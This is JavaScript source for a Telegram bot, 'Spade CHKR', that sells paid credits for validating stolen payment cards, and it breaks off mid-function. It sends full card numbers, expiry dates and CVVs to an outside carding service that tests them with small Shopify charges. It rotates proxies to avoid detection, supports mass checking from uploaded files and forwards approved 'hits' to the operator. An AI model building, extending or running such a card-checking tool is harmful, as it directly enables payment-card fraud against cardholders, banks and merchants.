const TelegramBot = require("node-telegram-bot-api");
const mongoose = require("mongoose");
const axios = require("axios");
const express = require("express");
const { formatProxy, testProxy } = require('./proxy.js');
const { HttpsProxyAgent } = require('https-proxy-agent');
require("dotenv").config();

// Environment variables
const token = process.env.BOT_TOKEN;
const mongoUrl = process.env.MONGO_URL;
const port = process.env.PORT || 3000;
const adminId = 5291409360; // Your Admin ID

// Setup Express Health Check Server
const app = express();
app.get("/", (req, res) => res.send("Spade CHKR Bot is running gracefully."));
app.listen(port, "0.0.0.0", () =>
  console.log(`Health check server listening on port ${port}`),
);

// Initialize Bot
const bot = new TelegramBot(token, { polling: true });

// Helper Functions
function escapeHTML(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getRandomProxy(proxies) {
    if (!proxies || proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Database Setup
const configSchema = new mongoose.Schema({
  key: { type: String, default: "main_config" },
  shopifySiteUrl: String,
});
const Config = mongoose.model("Config", configSchema);

// Additional Schemas for User and Redeem System
const userSchema = new mongoose.Schema({
  chatId: { type: Number, unique: true },
  firstName: String,
  joinDate: { type: Date, default: Date.now },
  credits: { type: Number, default: 0 },
  planExpiry: { type: Date, default: null },
  planName: { type: String, default: "Free" },
  totalChecked: { type: Number, default: 0 },
  totalApproved: { type: Number, default: 0 },
  totalDeclined: { type: Number, default: 0 },
  isBanned: { type: Boolean, default: false },
  proxies: { type: [String], default: [] },
});
const User = mongoose.model("User", userSchema);

const redeemSchema = new mongoose.Schema({
  code: { type: String, unique: true },
  credits: Number,
  daysValid: Number,
  planName: String,
  isUsed: { type: Boolean, default: false },
  usedBy: Number,
});
const Redeem = mongoose.model("Redeem", redeemSchema);

mongoose
  .connect(mongoUrl)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch((err) => console.error("❌ MongoDB Error:", err));

process.on("uncaughtException", (err) => console.error(err));
process.on("unhandledRejection", (reason) => console.error(reason));

// User States
const userStates = {};

// Ensure User Exists
async function getUser(chatId, firstName) {
  let user = await User.findOne({ chatId });
  if (!user) {
    user = await User.create({
      chatId,
      firstName,
      credits: 0,
      planName: "Free",
    });
  }

  if (user.planExpiry && new Date() > user.planExpiry) {
    user.credits = 0;
    user.planName = "Free";
    user.planExpiry = null;
    await user.save();
  }
  return user;
}

// Check & Deduct Credits
async function deductCredits(user, amount) {
  if (user.isBanned) return false;
  if (user.credits >= amount) {
    user.credits -= amount;
    user.totalChecked += amount;
    await user.save();
    return true;
  }
  return false;
}

// Core Checker Logic
// Core Checker Logic
async function processCard(ccInput, rawProxy, retries = 2) {
  let result = {
    cc: escapeHTML(ccInput),
    isApproved: false,
    statusText: "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌",
    responseText: "DECLINED",
    brand: "VISA",
    issuer: "BANK",
    country: "USA 🇺🇸",
  };

  let axiosConfig = {
    timeout: 20000,
    proxy: false,
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      Accept: "application/json",
    },
  };

  for (let i = 0; i <= retries; i++) {
    try {
      // ✅ Get site from DB
      let config = await Config.findOne({ key: "main_config" });
      let siteUrl = config?.shopifySiteUrl || "https://planterhomawholesale.com/";
      if (!siteUrl.endsWith("/")) siteUrl += "/";

      // ✅ Format CC: ensure 4-digit year, padded month
      const ccParts = ccInput.trim().split(/[|\/\s]+/);
      let formattedCC = ccInput.trim();

      if (ccParts.length === 4) {
        let [num, mm, yy, cvv] = ccParts;
        if (yy.length === 2) yy = "20" + yy;
        if (mm.length === 1) mm = "0" + mm;
        formattedCC = `${num}|${mm}|${yy}|${cvv}`;
      }

      // ✅ Build proxy param (strip protocol)
      let proxyParam = "";
      if (rawProxy) {
        proxyParam = rawProxy
          .replace(/^https?:\/\//, "")
          .replace(/^socks5?:\/\//, "");
      }

      // ✅ Build URL — NO encodeURIComponent (nik.cards needs raw URL)
      let apiUrl = `https://nik.cards/shopify?site=${siteUrl}&cc=${formattedCC}`;
      if (proxyParam) {
        apiUrl += `&proxy=${proxyParam}`;
      }

      console.log(`[CHECK] URL: ${apiUrl}`);

      const shopifyRes = await axios.get(apiUrl, axiosConfig);
      const data = shopifyRes.data || {};

      console.log(`[CHECK] Response:`, JSON.stringify(data));

      // ✅ Parse response
      let isApproved = false;
      let responseMsg = "DECLINED";

      if (typeof data.Status !== "undefined") {
        isApproved = data.Status === true || data.Status === "true";
        responseMsg = data.Response || data.Message || (isApproved ? "APPROVED" : "DECLINED");
      } else if (typeof data.status !== "undefined") {
        isApproved = String(data.status).toLowerCase() === "approved" || String(data.status).toLowerCase() === "true";
        responseMsg = data.message || data.Response || (isApproved ? "APPROVED" : "DECLINED");
      } else if (typeof data.success !== "undefined") {
        isApproved = data.success === true;
        responseMsg = data.msg || data.message || (isApproved ? "APPROVED" : "DECLINED");
      } else {
        const raw = JSON.stringify(data).toLowerCase();
        isApproved = raw.includes("approved") && !raw.includes("not approved");
        responseMsg = data.Response || data.message || data.msg || "DECLINED";
      }

      result.isApproved = isApproved;
      result.statusText = isApproved ? "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" : "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌";
      result.responseText = escapeHTML(String(responseMsg));

      break; // ✅ Success — stop retrying

    } catch (error) {
      console.error(`[CHECK] Error attempt ${i + 1}:`, error.message);
      if (i === retries) {
        let errMsg =
          error.response?.data?.Response ||
          error.response?.data?.message ||
          error.response?.statusText ||
          error.message ||
          "API Error";
        result.responseText = escapeHTML(String(errMsg));
      } else {
        await sleep(2000 * (i + 1));
      }
    }
  }

  // ✅ BIN Lookup
  const bin = ccInput.replace(/[^0-9]/g, "").substring(0, 6);
  try {
    const binRes = await axios.get(`https://lookup.binlist.net/${bin}`, {
      timeout: 5000,
      headers: { "Accept-Version": "3" },
    });
    if (binRes.data) {
      result.brand = escapeHTML(binRes.data.scheme?.toUpperCase() || result.brand);
      result.issuer = escapeHTML(binRes.data.bank?.name?.toUpperCase() || result.issuer);
      result.country = `${escapeHTML(binRes.data.country?.name?.toUpperCase() || "USA")} ${binRes.data.country?.emoji || "🇺🇸"}`;
    }
  } catch (e) {}

  return result;
}

function formatCardResult(data, userName, userId) {
  return (
    `<tg-emoji emoji-id="${data.isApproved ? "6138803821394009204" : "5402104393396931859"}">✨</tg-emoji> 𝐒𝐭𝐚𝐭𝐮𝐬 ➠ ${data.statusText}\n` +
    `<tg-emoji emoji-id="6138728977293907990">💳</tg-emoji> 𝐂𝐚𝐫𝐝 ➠ <code>${data.cc}</code>\n` +
    `<tg-emoji emoji-id="6136204644625423818">⚡</tg-emoji> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟎.𝟗𝟖 𝐔𝐒𝐃\n` +
    `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ ${data.responseText}\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `🏦 𝐁𝐫𝐚𝐧𝐝 ➠ ${data.brand}\n` +
    `🏛 𝐈𝐬𝐬𝐮𝐞𝐫 ➠ ${data.issuer}\n` +
    `🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ ${data.country}\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `👤 𝐔𝐬𝐞𝐫 ➠ <a href="tg://user?id=${userId}">${escapeHTML(userName || "User")}</a>\n` +
    `<tg-emoji emoji-id="6136250085379413636">💎</tg-emoji> 𝐃𝐞𝐯 ➠ @ZeroSpade`
  );
}

function sendUserHome(msg) {
  const caption =
    `<tg-emoji emoji-id="6138869285285537620">♠️</tg-emoji> 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 <a href="https://t.me/Spade_ChkrBot">𝐒𝐩𝐚𝐝𝐞 𝐂𝐇𝐊𝐑</a>\n` +
    `━━━━━━━━━━━━━\n` +
    `<tg-emoji emoji-id="6138532229137049159">🔥</tg-emoji> 𝑾𝑯𝑬𝑹𝑬 𝑳𝑬𝑮𝑬𝑵𝑫𝑺 𝑩𝑼𝑹𝑵 𝑻𝑯𝑹𝑶𝑼𝑮𝑯 𝑭𝑰𝑹𝑬 <tg-emoji emoji-id="6253483549890973859">🔥</tg-emoji>\n` +
    `𝑮𝑶𝒕 𝒀𝒐𝒖𝒓 𝑭𝒖𝒍𝒍 𝑽𝒂𝒍𝒖𝒆 𝑯𝒆𝒓𝒆\n` +
    `━━━━━━━━━━━━━\n` +
    `<tg-emoji emoji-id="5258332798409783582">⚙️</tg-emoji> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 ~ 𝐯𝟐.𝟎\n` +
    `━━━━━━━━━━━━━\n` +
    `<tg-emoji emoji-id="6136205108481890460">👑</tg-emoji> 𝐃𝐞𝐯 ~ <a href="https://t.me/ZeroSpade">𝘚𝘱𝘢𝘥𝘦 • 𝘔𝘪𝘯𝘪𝘴𝘵𝘦𝘳</a> <tg-emoji emoji-id="6086904445906459445">👑</tg-emoji>`;

  const premiumKeyboard = {
    inline_keyboard: [
      [
        {
          text: " Gᴀᴛᴇs",
          callback_data: "gate_menu",
          icon_custom_emoji_id: "6136316288005314906",
          color: "primary",
        },
        {
          text: " Mᴀss",
          callback_data: "mass_menu",
          icon_custom_emoji_id: "6138728977293907990",
          color: "primary",
        },
      ],
      [
        {
          text: " Pʀᴏғɪʟᴇ",
          callback_data: "profile_menu",
          icon_custom_emoji_id: "6136250085379413636",
          color: "primary",
        },
        {
          text: " Tᴏᴏʟs",
          callback_data: "tools_menu",
          icon_custom_emoji_id: "6138961691506907344",
          color: "primary",
        },
      ],
      [
        {
          text: " Pʀɪᴄɪɴɢ",
          callback_data: "pricing_menu",
          icon_custom_emoji_id: "5424976816530014958",
          color: "primary",
        },
        {
          text: " OᴡɴᴇR ↗",
          url: "https://t.me/ZeroSpade",
          icon_custom_emoji_id: "6136665868278438410",
          color: "primary",
        },
      ],
    ],
  };

  bot.sendPhoto(msg.chat.id, "https://i.ibb.co/wFtyhXJY/x.jpg", {
    caption: caption,
    parse_mode: "HTML",
    reply_markup: premiumKeyboard,
  });
}

// --- START COMMAND ---
bot.onText(/^\/start/, async (msg) => {
  delete userStates[msg.chat.id]; // Reset state
  await getUser(msg.chat.id, msg.from.first_name);

  if (msg.chat.id === adminId) {
    const adminText = `<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋</b>\n\nWelcome back, Developer! Choose an option to manage the bot:`;
    const adminKeyboard = {
      inline_keyboard: [
        [{ text: " Users List", callback_data: "admin_users_list" }],
        [
          { text: " Manage Users", callback_data: "admin_manage_users" },
          { text: " Broadcast", callback_data: "admin_broadcast" },
        ],
        [{ text: " Generate Redeem", callback_data: "admin_gen_redeem" }],
        [{ text: " Access User Menu", callback_data: "admin_user_menu" }],
      ],
    };
    return bot.sendMessage(msg.chat.id, adminText, {
      parse_mode: "HTML",
      reply_markup: adminKeyboard,
    });
  }

  sendUserHome(msg);
});

bot.onText(/^\/proxy(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  await getUser(chatId, msg.from.first_name); 

  let proxyText = match[1] || "";
  
  if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
          proxyText = msg.reply_to_message.text;
      } else if (msg.reply_to_message.document && msg.reply_to_message.document.mime_type === "text/plain") {
          const fileLink = await bot.getFileLink(msg.reply_to_message.document.file_id);
          const fileRes = await axios.get(fileLink);
          proxyText = fileRes.data;
      }
  }

  if (!proxyText.trim()) {
    return bot.sendMessage(chatId, "⚠️ <b>Missing proxy!</b>\n\n<i>Usage: /proxy username:password@host:port</i>\n\n<i>Or reply to a message containing proxies with /proxy</i>", { parse_mode: "HTML" });
  }

  let statusMsg = await bot.sendMessage(chatId, "⏳ Testing your proxies...", { parse_mode: "HTML" });
  
  const candidates = proxyText.split(/[\n\s]+/).map(p => p.trim()).filter(p => p.length > 5);
  let user = await User.findOne({ chatId });
  
  let validAdded = 0;
  let alreadyMax = false;
  let workingList = [];

  for (let rawProxy of candidates) {
      if (user.proxies.length >= 10) {
          alreadyMax = true;
          break;
      }
      const formatted = formatProxy(rawProxy);
      if (formatted && !user.proxies.includes(formatted)) {
          const isLive = await testProxy(formatted);
          if (isLive) {
              user.proxies.push(isLive);
              workingList.push(isLive);
              validAdded++;
          }
      }
  }

  await user.save();

  let resTxt = `✅ <b>Added ${validAdded} live proxies!</b>\n`;
  if (alreadyMax) resTxt += `\n⚠️ You reached the max limit of 10 proxies.\n`;
  if (validAdded === 0 && !alreadyMax) resTxt = `❌ <b>No Working Proxies Found Or They Failed Test.</b>\nEnsure formats are correct.`;

  bot.editMessageText(resTxt, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" });
});

bot.onText(/^\/myproxy/, async (msg) => {
  const chatId = msg.chat.id;
  let user = await getUser(chatId, msg.from.first_name);

  if (!user.proxies || user.proxies.length === 0) {
    return bot.sendMessage(chatId, "⚠️ You don't have any proxies set.\nUse <code>/proxy IP:PORT:USER:PASS</code> or reply to a list.", { parse_mode: "HTML" });
  }

  let pList = user.proxies.map((p, i) => {
      // Mask password
      let display = p;
      try {
          const parts = p.split("://");
          if (parts.length === 2) {
              const authHost = parts[1].split("@");
              if (authHost.length === 2) {
                  const userPass = authHost[0].split(":");
                  display = `${parts[0]}://${userPass[0]}:******@${authHost[1]}`;
              }
          }
      } catch (e) {}
      return `${i + 1}. <code>${display}</code>`;
  }).join("\n");

  let msgTxt = `🛠 <b>𝐘𝐎𝐔𝐑 𝐏𝐑𝐎𝐗𝐈𝐄𝐒 [${user.proxies.length}/10]</b>\n━━━━━━━━━━━━━━━━━\n${pList}\n\n<i>Use /rproxy [count] to remove.</i>`;
  bot.sendMessage(chatId, msgTxt, { parse_mode: "HTML" });
});

bot.onText(/^\/rproxy(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  let user = await getUser(chatId, msg.from.first_name);

  if (!user.proxies || user.proxies.length === 0) {
    return bot.sendMessage(chatId, "⚠️ You don't have any proxy set.", { parse_mode: "HTML" });
  }
  
  let countInput = match[1] ? match[1].trim() : null;
  let removed = 0;

  if (countInput && !isNaN(countInput)) {
      let numToRemove = parseInt(countInput);
      let toRemove = Math.min(numToRemove, user.proxies.length);
      user.proxies.splice(-toRemove, toRemove); // remove from end
      removed = toRemove;
  } else {
      removed = user.proxies.length;
      user.proxies = [];
  }

  await user.save();
  bot.sendMessage(chatId, `✅ <b>Successfully removed ${removed} proxies.</b>`, { parse_mode: "HTML" });
});

// --- SINGLE CHECK COMMAND ---
bot.onText(/^\/sh(?: (.+))?/, async (msg, match) => {
  delete userStates[msg.chat.id];
  const chatId = msg.chat.id;
  const user = await getUser(chatId, msg.from.first_name);

  if (user.isBanned)
    return bot.sendMessage(
      chatId,
      `<tg-emoji emoji-id="5402104393396931859">⚠️</tg-emoji> You are blocked.`,
      { parse_mode: "HTML" },
    );

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `⚠️ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐂𝐂.\nFormat: <code>/sh cc|mm|yy|cvv</code>`,
      { parse_mode: "HTML" },
    );
  }

  if (!(await deductCredits(user, 1))) {
    return bot.sendMessage(
      chatId,
      `💳 <b>Not enough credits!</b> Please buy or redeem credits.\nUse /redeem CODE`,
      { parse_mode: "HTML" },
    );
  }

  const ccInput = match[1].trim();
  const safeCC = escapeHTML(ccInput);

  const processText =
    `<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐏 𝐑 𝐎 𝐂 𝐄 𝐒 𝐒 𝐈 𝐍 𝐆 . . .</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `<tg-emoji emoji-id="6138728977293907990">💳</tg-emoji> <b>𝐂𝐚𝐫𝐝:</b> <code>${safeCC}</code>\n` +
    `<tg-emoji emoji-id="6136204644625423818">⚡</tg-emoji> <b>𝐆𝐚𝐭𝐞:</b> 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟎.𝟗𝟖$\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `<i>"𝘎𝘳𝘦𝘢𝘵 𝘵𝘩𝘪𝘯𝘨𝘴 𝘵𝘢𝘬𝘦 𝘵𝘪𝘮𝘦, 𝘭𝘦𝘨𝘦𝘯𝘥."</i>`;

  let processingMsg = await bot.sendMessage(chatId, processText, {
    parse_mode: "HTML",
  });

  const cardData = await processCard(ccInput, getRandomProxy(user.proxies));

  if (cardData.isApproved) {
    user.totalApproved += 1;
  } else {
    user.totalDeclined += 1;
  }
  await user.save();

  const finalMessage = formatCardResult(
    cardData,
    msg.from.first_name,
    msg.from.id,
  );

  await bot.editMessageText(finalMessage, {
    chat_id: chatId,
    message_id: processingMsg.message_id,
    parse_mode: "HTML",
  });

  if (cardData.isApproved && chatId !== adminId) {
    bot.sendMessage(
      adminId,
      `🟢 <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐇𝐢𝐭 𝐁𝐲 <a href="tg://user?id=${chatId}">${escapeHTML(msg.from.first_name)}</a></b>\n━━━━━━━━━\n${finalMessage}`,
      { parse_mode: "HTML" },
    );
  }
});

// --- MASS CHECK COMMAND VIA TEXT ---
bot.onText(/^\/shmt/, async (msg) => {
  bot.sendMessage(
    msg.chat.id,
    `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> <b>𝐒𝐞𝐧𝐝 𝐦𝐞 𝐲𝐨𝐮𝐫 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞.</b>\n(One CC per line please)`,
    { parse_mode: "HTML" },
  );
  userStates[msg.chat.id] = "WAITING_TXT";
});

// --- CALLBACK QUERIES (MENUS) ---
bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id;
  const msgId = cb.message.message_id;

  try {
    if (cb.data === "admin_user_menu") {
      sendUserHome(cb.message);
    } else if (cb.data === "gate_menu") {
      bot.editMessageReplyMarkup(
        {
          inline_keyboard: [
            [
              {
                text: " 𝐂𝐡𝐚𝐫𝐠𝐞𝐝",
                callback_data: "charged_menu",
                icon_custom_emoji_id: "6136316288005314906",
                color: "primary",
              },
            ],
          ],
        },
        { chat_id: chatId, message_id: msgId },
      );
    } else if (cb.data === "charged_menu") {
      bot.editMessageReplyMarkup(
        {
          inline_keyboard: [
            [
              {
                text: " 𝐒𝐡𝐨𝐩𝐢𝐟𝐲",
                callback_data: "sh_info",
                icon_custom_emoji_id: "6138961691506907344",
                color: "primary",
              },
            ],
          ],
        },
        { chat_id: chatId, message_id: msgId },
      );
    } else if (cb.data === "sh_info") {
      const shInfoText =
        `<tg-emoji emoji-id="6136250085379413636">💎</tg-emoji> 𝐆𝐚𝐭𝐞 ➠ 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟏$\n` +
        `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 ➠ <code>/sh cc|mm|yy|cvv</code>\n` +
        `<tg-emoji emoji-id="6255591515544882364">✔️</tg-emoji> 𝐇𝐞𝐚𝐥𝐭𝐡 ➠ 𝟏𝟎𝟎% 𝐀𝐜𝐭𝐢𝐯𝐞\n` +
        `━━━━━━━━━━━━━━━━━\n` +
        `<tg-emoji emoji-id="5212920133504212456">🔥</tg-emoji> 𝘗𝘰𝘸𝘦𝘳𝘦𝘥 𝘉𝘺 𝘚𝘱𝘢𝘥𝘦`;
      bot.sendMessage(chatId, shInfoText, { parse_mode: "HTML" });
    } else if (cb.data === "mass_menu") {
      bot.editMessageReplyMarkup(
        {
          inline_keyboard: [
            [
              {
                text: " .txt Fɪʟᴇ",
                callback_data: "mass_txt",
                icon_custom_emoji_id: "6138728977293907990",
                color: "primary",
              },
            ],
          ],
        },
        { chat_id: chatId, message_id: msgId },
      );
    } else if (cb.data === "mass_txt") {
      userStates[chatId] = "WAITING_TXT";
      bot.sendMessage(
        chatId,
        `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> <b>𝐒𝐞𝐧𝐝 𝐦𝐞 𝐲𝐨𝐮𝐫 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞.</b>\n(One CC per line please)`,
        { parse_mode: "HTML" },
      );
    } else if (cb.data === "tools_menu") {
      const toolsText =
        `<tg-emoji emoji-id="5219827798125846744">👑</tg-emoji> <b>𝐒𝐏𝐀𝐃𝐄 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔</b>\n` +
        `━━━━━━━━━━━━━━━━━\n` +
        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/sh</code> - 𝐅𝐨𝐫 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟏$\n` +
        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/shmt</code> - 𝐅𝐨𝐫 𝐌𝐚𝐬𝐬 𝐓𝐱𝐭 𝐅𝐢𝐥𝐞\n` +
        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/proxy</code> - 𝐒𝐞𝐭 𝐏𝐫𝐨𝐱𝐲 (IP:PORT:USER:PASS)\n` +
        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/myproxy</code> - 𝐂𝐡𝐞𝐜𝐤 𝐏𝐫𝐨𝐱𝐲\n` +
        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/rproxy</code> - 𝐃𝐞𝐥𝐞𝐭𝐞 𝐏𝐫𝐨𝐱𝐲\n\n` +
        `<i>Many More Comming Soon..In V2</i> <tg-emoji emoji-id="5212920133504212456">🔥</tg-emoji>`;
      bot.sendMessage(chatId, toolsText, { parse_mode: "HTML" });
    } else if (cb.data === "pricing_menu") {
      const pricingText =
        `<tg-emoji emoji-id="5215191209131123104">💎</tg-emoji> <b>𝐒𝐏𝐀𝐃𝐄 𝐂𝐇𝐊𝐑 𝐁𝐎𝐓 𝐏𝐑𝐈𝐂𝐈𝐍𝐆</b> <tg-emoji emoji-id="5215191209131123104">💎</tg-emoji>\n` +
        `━━━━━━━━━━━━━━━━━\n\n` +
        `<tg-emoji emoji-id="6253656229051109191">✔️</tg-emoji> <b>𝟏,𝟎𝟎𝟎 𝐂𝐫𝐞𝐝𝐢𝐭</b>  $𝟓 \n` +
        `⏳ <b>𝟕 𝐃𝐚𝐲𝐬 𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲</b>\n\n` +
        `<tg-emoji emoji-id="6253656229051109191">✔️</tg-emoji> <b>𝟐,𝟎𝟎𝟎 𝐂𝐫𝐞𝐝𝐢𝐭</b> $𝟖\n` +
        `⏳ <b>𝟕 𝐃𝐚𝐲𝐬 𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲</b>\n\n` +
        `<tg-emoji emoji-id="6253656229051109191">✔️</tg-emoji> <b>𝟏𝟎,𝟎𝟎𝟎 𝐂𝐫𝐞𝐝𝐢𝐭𝐬</b> $𝟏𝟓\n` +
        `⏳ <b>𝟑𝟎 𝐃𝐚𝐲𝐬 𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲</b>\n\n` +
        `━━━━━━━━━━━━━━━━━\n` +
        `<i>Secure, Fast, and Reliable Checker.</i> <tg-emoji emoji-id="5215399540814781035">👑</tg-emoji>`;

      bot.sendMessage(chatId, pricingText, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: " 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫 𝐓𝐨 𝐁𝐮𝐲",
                url: "https://t.me/ZeroSpade",
                color: "positive",
              },
            ],
          ],
        },
      });
    } else if (cb.data === "profile_menu") {
      const user = await getUser(chatId, cb.from.first_name);
      const total = user.totalApproved + user.totalDeclined;
      const joinDateStr = new Date(user.joinDate).toLocaleDateString("en-GB", {
        day: "2-digit",
        month: "short",
        year: "numeric",
      });

      let expiryStr = "No Expiry";
      if (user.planExpiry) {
        expiryStr = new Date(user.planExpiry).toLocaleDateString("en-GB", {
          day: "2-digit",
          month: "short",
          year: "numeric",
        });
      }

      const profileText =
        `<tg-emoji emoji-id="6136250085379413636">💎</tg-emoji> <b>𝐘𝐎𝐔𝐑 𝐒𝐏𝐀𝐃𝐄 𝐏𝐑𝐎𝐅𝐈𝐋𝐄</b>\n` +
        `━━━━━━━━━━━━━━━━━\n` +
        `<tg-emoji emoji-id="6255561528083221310">✉️</tg-emoji> <b>𝐁𝐨𝐭 𝐉𝐨𝐢𝐧𝐞𝐝 𝐎𝐧:</b> ${joinDateStr}\n` +
        `<tg-emoji emoji-id="6138728977293907990">💳</tg-emoji> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> ${total}\n` +
        `━━━━━━━━━━━━\n` +
        `<tg-emoji emoji-id="6138803821394009204">✨</tg-emoji> <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> ${user.totalApproved}\n` +
        `<tg-emoji emoji-id="5402104393396931859">❌</tg-emoji> <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> ${user.totalDeclined}\n` +
        `━━━━━━━━━━━━\n` +
        `<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>𝐏𝐥𝐚𝐧:</b> ${escapeHTML(user.planName)}\n` +
        `<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲:</b> ${expiryStr}\n` +
        `<tg-emoji emoji-id="5215191209131123104">💰</tg-emoji> <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐋𝐞𝐟𝐭:</b> ${user.credits}\n` +
        `━━━━━━━━━━━━━━━━━`;

      bot.sendMessage(chatId, profileText, { parse_mode: "HTML" });
    } else if (cb.data.startsWith("admin_")) {
      if (chatId !== adminId) return;
      handleAdminMenu(cb, chatId);
    }
  } catch (err) {
    console.error(err);
  }

  bot.answerCallbackQuery(cb.id).catch(() => {});
});

// Admin Sub-menus logic
async function handleAdminMenu(cb, chatId) {
  if (cb.data === "admin_users_list") {
    const users = await User.find({}, "firstName chatId credits planName");
    const jsonList = JSON.stringify(users, null, 2);

    if (jsonList.length < 4000) {
      bot.sendMessage(
        chatId,
        "<b>Users JSON List:</b>\n<pre>" + escapeHTML(jsonList) + "</pre>",
        { parse_mode: "HTML" },
      );
    } else {
      const buffer = Buffer.from(jsonList, "utf-8");
      bot.sendDocument(chatId, buffer, { filename: "users.json" });
    }
  } else if (cb.data === "admin_manage_users") {
    userStates[chatId] = "WAITING_ADMIN_USERID";
    bot.sendMessage(
      chatId,
      "Please enter the Target User's Chat ID to Manage:",
    );
  } else if (cb.data === "admin_broadcast") {
    userStates[chatId] = "WAITING_BROADCAST";
    bot.sendMessage(
      chatId,
      "Please send the message you want to broadcast to all users:",
    );
  } else if (cb.data === "admin_gen_redeem") {
    const keysText = `Select a pack to generate Redeem Code for:`;
    bot.sendMessage(chatId, keysText, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Trial 100 (1D)", callback_data: "admin_rd_trial" }],
          [
            { text: "1,000 Credits (7D)", callback_data: "admin_rd_1k" },
            { text: "2,000 Credits (7D)", callback_data: "admin_rd_2k" },
          ],
          [{ text: "10,000 Credits (30D)", callback_data: "admin_rd_10k" }],
        ],
      },
    });
  } else if (cb.data.startsWith("admin_rd_")) {
    let codeLabel = cb.data.replace("admin_rd_", "");
    let randStr = Math.random().toString(36).substring(2, 7).toUpperCase();
    let code = "",
      creds = 0,
      days = 0,
      pName = "";

    switch (codeLabel) {
      case "trial":
        code = `1D_${randStr}_SPADECHKR`;
        creds = 100;
        days = 1;
        pName = "Trial";
        break;
      case "1k":
        code = `7D_${randStr}_SPADECHKR`;
        creds = 1000;
        days = 7;
        pName = "1k Premium";
        break;
      case "2k":
        code = `7D_${randStr}_SPADECHKR`;
        creds = 2000;
        days = 7;
        pName = "2k Premium";
        break;
      case "10k":
        code = `30D_${randStr}_SPADECHKR`;
        creds = 10000;
        days = 30;
        pName = "10k Elite";
        break;
    }

    await Redeem.create({
      code,
      credits: creds,
      daysValid: days,
      planName: pName,
    });
    bot.sendMessage(
      chatId,
      `✅ <b>Redeem Code Created!</b>\n\n<code>${code}</code>\n\nPlan: ${pName} (${creds} C / ${days} D)`,
      { parse_mode: "HTML" },
    );
  } else if (cb.data.startsWith("admin_mod_")) {
    let parts = cb.data.split("_");
    let action = parts[2];
    let targetId = parts[3];
    const user = await User.findOne({ chatId: targetId });
    if (!user) return bot.sendMessage(chatId, "User not found.");

    let amt = parseInt(parts[4] || "0");

    if (action === "ban") user.isBanned = true;
    if (action === "unban") user.isBanned = false;
    if (action === "give") {
      user.credits += amt;
      let d = new Date();
      d.setDate(d.getDate() + (amt >= 10000 ? 30 : 7));
      user.planExpiry = d;
      user.planName = amt >= 1000 ? `${amt / 1000}k Premium` : "Admin Granted";
    }
    await user.save();
    bot.sendMessage(chatId, `✅ Success apply ${action} for ${targetId}`);
  }
}

// User raw text handler for States
bot.on("text", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (!text || text.startsWith("/")) return; // Ignore commands

  let state = userStates[chatId];
